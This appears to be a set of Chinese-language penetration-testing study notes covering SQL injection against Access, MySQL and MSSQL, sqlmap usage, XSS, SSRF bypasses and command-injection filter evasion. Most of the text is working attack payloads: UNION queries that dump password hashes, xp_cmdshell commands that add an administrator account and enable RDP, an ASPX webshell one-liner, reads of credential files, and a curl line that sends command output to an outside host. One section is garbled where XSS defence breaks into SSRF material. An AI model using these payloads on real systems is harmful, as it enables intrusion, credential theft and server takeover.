​	ODBC 驱动程序不支持所需的属性。 
3、Mysql报错信息：
​	Warning:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy\WWW\mysql\sql.php on line 12
内置数据表爆数据库类型如果服务器IIS不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点后提交如下查询语句。
and  (select count(*)  from sysobjects)&gt;0
and (select count(*)  from msysobjects)&gt;0
1、MsSQL报错信息：
​	在MS SQL Serve:存在系统表[sysobjects]，不存在[msysobjects]系统表
​	Microsoft OLE DB Provider for SQL Server 错误 ‘80040e37’
​	对象名 ‘msysobjects’ 无效。
​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8
2、Access报错信息：
​	Access存在系统表[msysobjects]，不存在“sysobjects”表。
​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’
​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8
​	[Microsoft][ODBC Microsoft Access Driver] Microsoft Jet数据库引擎找不到输入表或查询’sysobjects’。确定它是否存在，以及它的名称的拼写是否正确。
3、Mysql报错信息：
​	Warning:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy\WWW\mysql\sql.php on line 12
Access注入步骤爆出数据库类型典型网站：http://192.168.138.130:81/news_view.asp?id=14
通过方法一：
​	http://192.168.138.130:81/news_view.asp?id=14\%20and\%20user\%3E0
​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e21’
​	ODBC 驱动程序不支持所需的属性。
​	&#x2F;news_view.asp，行 20 
可以判断出改数据库类型为Access数据库
猜解数据库表名​	可在注入点后提交如下语句进行查询。
​	and exists(select *  from 数据库表名 )
​	或者
​	and (select count(*) from 数据库表名 )&gt;&#x3D;0
​	上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更换其他常见数据库表名继续进行查询。
猜解表字段名及长度​	可在注入点后提交如下语句查询。
​	and exists(select 字段名  from 数据库表名 )
​	或者
​	and (select count(字段名) from 数据库表名 )&gt;&#x3D;0
​	如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。
​	猜解字段长度，可提交如下查询语句。
​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。
​	and (select top 1 len(字段名) from 数据库表名 )&gt;1
​	and (select top 1 len(字段名) from 数据库表名 )&gt;2
​	…
​	and (select top 1 len(字段名) from 数据库表名 )&gt;n-1
​	and (select top 1 len(字段名) from 数据库表名 )&gt;n
​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。
猜解字段值​	猜字段的ascii值，可在注入点后提交如下查询语句。
​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;0
​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;1
​	…
​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n-1
​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n
​	当提交&gt;n-I时正常，而提交到&gt;n时返回出错，那么说明字段值的ASCII码为n。反查ASCII码对应的字符，就可得到字段值的第一位字符。再继续提交如下查询。
​	and (select top 1 asc(mid(字段名,2,1)) from 数据库表名 )&gt;0
​	用与上面相同的方法，可得到第二位字符。再继续进行查询，直接猜解出字段的所有字符值为止。
Access注入实战案例案例地址：http://192.168.138.130:81/news_view.asp?id=14
猜解数据库表名和字段首先来猜解数据库表名，提交如下网址。
http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from users)
返回错误信息，说明users表不存在，继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from admin)
还是返回错误信息，说明admin表不存在，继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and exists(select * from administrator)
注入错误页面响应：

注入正确页面响应：

继续猜测字段并提交。
http://192.168.1.55:901/news_view.asp?id=14 and exists(select username from administrator)
返回错误信息，说明不存在username字段，继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and exists(select user_name from administrator)
返回正常页面，administrator表中存在字段user_name

猜解字段长度再继续猜测第一个字段内容长度。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)&gt;1&#x2F;&#x2F;正常
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)&gt;2  &#x2F;&#x2F;正常
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)&gt;4  &#x2F;&#x2F;正常
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 len(user_name) from administrator)&gt;5  &#x2F;&#x2F;报错

猜解字段内容现在猜解字段内容并提交。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;0  &#x2F;&#x2F;返回正常页面
说明ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，下面我们继续猜解。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;500  &#x2F;&#x2F;返回错误页面
说明字段对应的ASCll值在0和500之间。继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面
说明字段对应的ASCll值在0和100之间。继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;90  &#x2F;&#x2F;返回正常页面
说明字段对应的ASCll值在90和100之间。继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;96  &#x2F;&#x2F;返回正常页面
说明字段对应的ASCll值在96和100之间。继续提交。
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;97  &#x2F;&#x2F;返回错误页面
说明administrator表中的user_name字段的第一位ASCII值为97。通过反查ASCII值对应的字母，得到字符值为“a”接着第二位查询。

http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;99  &#x2F;&#x2F;返回正常页面(注：查第二个字母的时候记得把user_name后面的1变成2)
http://192.168.1.55:901/news_view.asp?id=14 and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面
用同样的方法，可猜解user_name字段值和password值,最终得到如下结果:

获取后台系统得到管理员用户名和密码后，登录后台:http://192.168.1.55:901/admin/index.asp，输入猜解出来的用户名和密码.就可以成功进入网站后台页面。
&#x3D;&#x3D;小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。&#x3D;&#x3D;
Mysql基础知识一：mysql4：没有information_schema库信息，因此需要获取库名、表名、字段名时，只能靠猜mysql5：拥有information_schema库信息，因此可以轻松获取库名、表名、字段名基础知识二：mysql中root用户是最高权限用户；mysql中保存用户信息的库是mysql库，对应表user表；等到用户密码信息，可以进行反向破解，最终获取用户名和密码，可以远程登录数据库ps：数据库8.0之后，密码的加密方式换了（sha2 早期mysql_native_password），不能用传统破解方式获取明文密码
Mysql实战案例典型页面：http://192.168.138.130:90/dvwa/vulnerabilities/sqli/
检查注入点在搜索框中输入：1’ or 71&#x3D;1

存在注入点
判断查询字段数http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+1\%23&amp;Submit=Submit#
1’ order by 1#
发现没有报错说明字段数&gt;1
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+2\%23&amp;Submit=Submit#
1’  order by 2#
发现没有报错说明字段数&gt;2
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27++order+by+3\%23&amp;Submit=Submit#
1’  order by 3#
页面报错：Unknown column ‘3’ in ‘order clause’
证明：查询的字段数为2
获取网站业务数据库名称查看当前的数据库和用户：
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+union+select+user\%28\%29\%2Cdatabase\%28\%29\%23&amp;Submit=Submit#
1’ union select user(),database()#
结果为：

获取数据库信息
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28schema_name\%29+from+information_schema.schemata\%23&amp;Submit=Submit#
1’union select 1,group_concat(schema_name) from information_schema.schemata#

concat()和group_concat()区别：

CONCAT() 用于将多个字符串或列值连接成一个字符串，适用于单行操作。
GROUP_CONCAT() 用于将分组中的多行值连接成一个字符串，适用于多行操作，并且支持去重、排序和自定义分隔符。

获取dvwa表名获取表名：
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28table_name\%29+from+information_schema.tables+where+table_schema\%3Ddatabase\%28\%29\%23&amp;Submit=Submit#
1’union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#

获取表里的字段值获取表里的字段值
1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #
table_name&#x3D;0x7573657273 使用十六进制编码的原因是：table_name&#x3D;users会报错

获取字段内容获取字段内容
http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1\%27+union+select+1\%2Cgroup_concat\%28user_id\%2C0x7c\%2Cfirst_name\%2C0x7c\%2Clast_name\%2C0x7c\%2Cuser\%2C0x7c\%2Cpassword\%2C0x7c\%2Cavatar\%2C0x7c\%29+from+users\%23&amp;Submit=Submit#
​    1’ union select 1,group_concat(user_id,0x7c,first_name,0x7c,last_name,0x7c,user,0x7c,password,0x7c,avatar,0x7c) from users#
结果：
1|admin|admin|admin|5f4dcc3b5aa765d61d8327deb882cf99|&#x2F;hackable&#x2F;users&#x2F;admin.jpg|,
2|Gordon|Brown|gordonb|e99a18c428cb38d5f260853678922e03|&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg|,
3|Hack|Me|1337|8d3533d75ae2c3966d7e0d4fcc69216b|&#x2F;hackable&#x2F;users&#x2F;1337.jpg|,
4|Pablo|Picasso|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|&#x2F;hackable&#x2F;users&#x2F;pablo.jpg|,
5|Bob|Smith|smithy|5
进一步渗透前提条件：

需要知道远程Web目录
需要mysql root权限
需要远程目录有写权限
需要数据库开启secure_file_priv 相当于secure_file_priv的值为空，不为空不充许写入webshell （默认不开启，需要修改mysql.ini配置文件）

获取web路径方法
%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+–+&amp;Submit&#x3D;Submit  路径记得转化为十六进制
0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C
&#x3D;C:\WINDOWS\system32\inetsrv\MetaBase.xml
常见Windows下的配置文件

c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息
c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码
c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
d:\APACHE\Apache2\conf\httpd.conf 
c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码

常见Linux下的配置文件

&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 
&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 
&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 
&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略
&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 
&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件
&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件
&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本
&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看

服务器读取文件：
union select 1,load_file(‘c:\boot.ini’) #
写webshell获取权限：
union select ““,2 into outfile “C:\phpStudy\WWW\123.php”#
MsSQL数据库用户信息：

_sa
数据库服务中权限最高的用户，同时此用户还可以对系统进行管理操作


_dbowner
可以编写webshell


_public
只能查询数据库中数据库信息、



典型网站：192.168.138.130:85&#x2F;sqlserver&#x2F;1.aspx？xxser&#x3D;
_SA用户攻击方式1、SQL注入检查服务类型
​	2 and exists(select * from sysobjects)
​	执行成功-确认为MsSQL数据库
2、SQL注入检查当前用户
​	确认用户名称信息：
​		and system_user&#x3D;0		通过IE报错页面获取用户名(推荐低版本IE浏览器)
​	是否具有特权权限
​		and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’))	检查注入位置是否具有sa权限(无报错，有报错选择其他用户)
3、SQL确认存储过程功能
​	（判断xp_cmdshell）只有激活了存储过程功能，才能使数据库管理员操作系统
​	and 1&#x3D;(select count(*) from master.dbo.sysobjects where name&#x3D;’xp_cmdshell’)	执行没报错-功能处于激活状态
​	EXEC sp_configure ‘show advanced options’, 1;  RECONFIGURE;  EXEC sp_configure ‘xp_cmdshell’, 1;  RECONFIGURE;–
​	——-激活存储过程功能
4、系统操作命令
​	添加用户账号(系统用户创建)：;exec master..xp_cmdshell ‘net user test test &#x2F;add’		
​	划分用户到管理组：;exec master..xp_cmdshell ‘net localgroup administrators test &#x2F;add’
​	启动3389远程功能：exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’ fDenyTSConnections’,’REG_DWORD’,0;
_dbowner用户攻击方式1、SQL注入检查当前用户
​	确认用户名称信息：and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–		判断当前用户是否为db_owner权限
 2、SQL注入获取网站路径
​	①通过报错信息
​	②通过搜索引擎（百度、谷歌）
​	③通过相关语句
​		;drop table black;create Table black(result varchar(7996) null,id int not null identity(1,1))–
​		;insert into black exec master..xp_cmdshell ‘dir &#x2F;s c:\1.aspx’–
​		and (select result from black where id&#x3D;4)&gt;0 –
3、SQL注入木马文件
​		%20;exec%20master..xp_cmdshell%20’Echo%20”&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;&gt;”%20c:\wwwtest\iis-xxser.com–wwwroot\sqlserver\muma.aspx’–
dir &#x2F;s c:\1.aspx：搜索1.aspx的路径，因为注入的地址就是1.aspx
使用webshell工具链接即可
_public用户攻击方式and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–  	报错，说明是_public，只能进行脱裤操作
1、确认数据库名称信息
​	业务数据库确认
​	and db_name()&#x3D;0–
​	获取mssql所有数据库名和路径
​	%20and%200&#x3D;(select%20top%202%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from%20(select%20top%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)–
&#x3D;&#x3D; and 0&#x3D;(select top 2 cast([name] as nvarchar(256))+char(94)+cast([filename] as nvarchar(256)) from (select top 2 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid]) t order by [dbid] desc)–
2、确认数据库表名称信息
​	获取当前数据库所有表名
​	and 0&lt;&gt;(select top 1 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500))–
3、确认数据表字段信息
爆表名及字段名
​	爆出表中第一个字段：having 1&#x3D;1–
​	爆出表中第二个字段：group by admin.id having 1&#x3D;1–
​	爆出表中第三个字段：group by admin.id,admin.name having 1&#x3D;1–
4、获取数据信息
/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))\%3E0/**/and/**/1=1
防御措施1、使用函数过滤，对敏感字符进行过滤
2、使用预编译和绑定变量
String sql=&quot;select id,no from user where id=?&quot;;    Preparedstatement ps=conn.preparestatement(sql);    ps.setInt(1,id);    ps.executeQuery();

通过prepare预编译函数会预先编译好,也就是SQL引I擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是时么，都不会影响该sql语句的语法结构了。只会被当做字符串字面值参数
3、使用WAF防火墙开启防SQL注入
4、直接下载相关防范注入文件，通过incloud包含放在网站配置文件里面
SQL注入工具SQLMAP项目地址：sqlmapproject&#x2F;sqlmap: Automatic SQL injection and database takeover tool
SqlMap常用参数
1、判断测试点
​	-r 指定注入参数（需要将请求头信息存储在指定文件，注意：复制请求同用crtl+a再复制）​		python sqlmap.py -r get.txt​	​	-u get方法注入，使用时需要加入注入的参数信息​		python sqlmap.py -u http://www.example.com/index.php?id=1​	​	–level&#x3D;LEVEL	执行测试的等级（1-5，默认为1）,使用–level参数且数值&gt;&#x3D;2的时候也会检查cookie里面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer。​		python sqlmap.py -u http://www.example.com/index.php?id=1 –level&#x3D;2​	​	–risk&#x3D;RISK		 执行测试的风险（0-3，默认为1）,默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。​		python sqlmap.py -u http://www.example.com/index.php?id=1 –risk&#x3D;3​	​	-v 				ERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请	求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。​		python sqlmap.py -u http://www.example.com/index.php?id=1 -v 3​	​	-p 				后面接参数，针对单个参数注入​		python sqlmap.py -u http://www.example.com/index.php?id=1&amp;name=ews -p id​	​	–threads		线程数，默认为10
​	-batch-smart	只能判断测试（推荐）​		python sqlmap.py -u http://www.example.com/index.php?id=1 -batch-smart​	​	–mobile		模拟测试手机环境站点 
​	-m 				批量注入，在指定文件内输入多个目标​		python sqlmap.py -m test.txt -batch-smart
2、获取数据
获取相关信息命令：

​	–dbs  &#x2F;&#x2F;默认情况系sqlmap会自动的探测web应用后端的数据库类型：MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAPMaxDB、DB2 
​	–current-user：大多数数据库中可检测到数据库管理系统当前用户 
​	–current-db：当前连接数据库名 
​	–is-dba：判断当前的用户是否为管理 
​	–users：列出数据库所有所有用户

获取表名				–tables -D 数据库名
获取字段名			    –columns -T user -D abc
获取数据内容			-T user -C username,password,email –dump
3、特殊命令
读取文件内容			–file-read &#x2F;etc&#x2F;password
系统交互的shell		    –os-shell
写webshell			     –file-write  “c:&#x2F;3.txt” –file-dest “C:&#x2F;phpStudy&#x2F;WWW&#x2F;3.php” -v1     
sqlmap过waf			 –tamper “[模块名]”					–存储在tamper目录下
 [sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx](sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx) 
XSS跨站脚本攻击基础知识XSS全称（Cross Site Scripting）跨站脚本攻击，XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。
漏洞出现原因：
​	程序对用户的输入没有进行严格的限制，导致恶意脚本在服务器前端有效代码解析执行从而产生危害
同源策略：
​	为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象
那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。
Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的
  //加载本地js执行
  //图片
  //css
  //任意资源
同源策略修改

D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php
   同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。



## 攻击类型

### 反射型XSS

**中危漏洞**

交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 







### 存储型XSS

**高危漏洞**

交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。





### DOM型XSS



**低危漏洞**

不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。

什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。



## 攻击发现

XSS漏洞注入点：（植入js代码）

- HTML context
- Attribute Context
- URL Context
- Style Context
- Script Context









## 测试方法

1、工具扫描：APPscan、AWVS 

2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF
    使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。

（1）在目标站点上找到输入点,比如查询接口,留言板等;
（2）输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;







## 漏洞防御

**防御方法01：前端表单限制**
    绕过方式01：修改前端页面代码
    绕过方法02：利用bp修改请求字段信息

**防御方法02：匹配字段信息做过滤（输入）**
\$message=preg_replace('/>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]

6.利用句号

127。0。0。1 &gt;&gt;&gt; 127.0.0.1

7、CRLF 编码绕过

%0d-&gt;0x0d-&gt;\r回车%0a-&gt;0x0a-&gt;\n换行进行HTTP头部注入
1 example.com&#x2F;?url&#x3D;http://eval.com\%0d\%0aHOST:fuzz.com\%0d\%0a 

8.利用封闭的字母数字

利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comhttp://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]List:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

漏洞防御1）过滤192.168.0.0&#x2F;10.0.0.0&#x2F;172.16.0.0  localhost 私有地址、ipv6地址
2）过滤file:&#x2F;&#x2F;&#x2F;    、 dict:&#x2F;&#x2F;   、gopher:&#x2F;&#x2F;   、ftp:&#x2F;&#x2F;、 http:&#x2F;&#x2F;   https:&#x2F;&#x2F;    php:&#x2F;&#x2F;&#x2F;危险schema
3）白名单过滤
4）对返回的内容进行识别
实战案例.&#x2F;doc&#x2F;11、SSRF攻击技术.docx
.&#x2F;doc&#x2F;SSRF攻击.xmind
命令执行漏洞漏洞介绍命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。
如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大
漏洞原理
​	应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞
漏洞危害

继承Web服务器程序的权限，去执行系统命令或读写文件
反弹shell
控制整个网站，甚至控制整个服务器

漏洞产生的原因

没有对用户的输入进行过滤或者过滤不严格
系统漏洞造成的代码执行
调用第三方组件存在代码执行漏洞

可能存在漏洞的函数利用系统函数实现远程命令执行的函数常见出现漏洞的地方：
​	只要带参数的地方都可能出现命令执行漏洞
​	常见的路由器、防火墙、入侵检测、自动化运维平台
eval（）、assert（）、preg_replace（）、call_user_func（）



如果页面存在以上的函数并且对用户的输入没有做严格的过滤，就存在RCE命令执行漏洞，还有其他的函数
ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）

直接执行系统命令的函数system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号





命令拼接符命令拼接符是进行命令链接的基础，会使用命令拼接符才是利用命令执行漏洞的基础
Windows常用命令拼接符
&amp;：拼接符两边只要有一个真就会执行&amp;&amp;：命令拼接符拼接多个命令时，会按照顺序执行，当遇到假的命令时会将终止执行。|：命令拼接符拼接多个命令时，只要有一个为假，其余都不执行；如果遇到为真则都执行，但是执行回显最后一个指令的运行结果。||：拼接多个指令时，按照顺序执行，执行完一个真的命令，则终止执行。





Linux的系统命令拼接符第一个是”&amp;”
​	‘&amp;’的作用是使命令在后台运行。只要在命令后面跟空格和&amp;，就可以在后台运行命令，终止方法是kill -s 进程号
第二个是”;”
​	就是分号，作用就是可以进行多条命令的无关联执行，每一条执行结果互不影响
第三个是”&amp;&amp;”
​	左边成功运行再执行右边
第四个是”||“
 这个也跟windows一样，前面执行失败才执行后面

第五个是”()”
​	如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起来
绕过方式编码绕过如果命令注入的网站过滤了某些分隔符，可以将分隔符编码后（url编码，base等）绕过
八进制绕过
&#x2F;&#x2F;ls命令，这个编码后可以拼接
$(printf  “\154\163”)

十六进制字符绕过
echo “636174202F6574632F706173737764” | xxd -r -p|bash


空格过滤
Linux内置分隔符：${IFS},$IFS,$IFS$9


利用重定向符&lt;&gt;

关键词绕过
通过拆分命令达到绕过的效果：a=1;b=s;\$a\$b

空变量绕过：cat fl$&#123;x&#125;ag cat tes$(z)t/flag

控制环境变量绕过：
先利用echo $PATH得到环境变量 &#x3D;&gt; “&#x2F;usr&#x2F;local&#x2F;….blablabla”接着利用echo${PATH}得到长度然后要哪个字符截取哪个字符就行${PATH:0:1} &#x3D;&gt; ‘&#x2F;’${PATH:1:1} &#x3D;&gt; ‘u’${PATH:0:4} &#x3D;&gt; ‘&#x2F;usr’

空值绕过：cat fl&quot;&quot;ag cat fl&#39;&#39;ag cat &quot;fl&quot;&quot;ag&quot;

反斜杠绕过：ca\t flag l\s



空变量
$*和$@，$x(x 代表 1-9)，${x}(x&gt;&#x3D;10)：比如ca$&#123;21&#125;t a.txt表示cat a.txt在没有传入参数的情况下，这些特殊字符默认为空，如下:

wh$1oami
who$@ami
whoa$*mi



花括号的用法
在Linux bash中还可以使用&#123;OS_COMMAND,ARGUMENT&#125;来执行系统命令&#123;cat,flag&#125;


无回显的命令执行可以通过curl命令将命令的结果输出到访问的url中：
curl www.rayi.vip/`whoami`



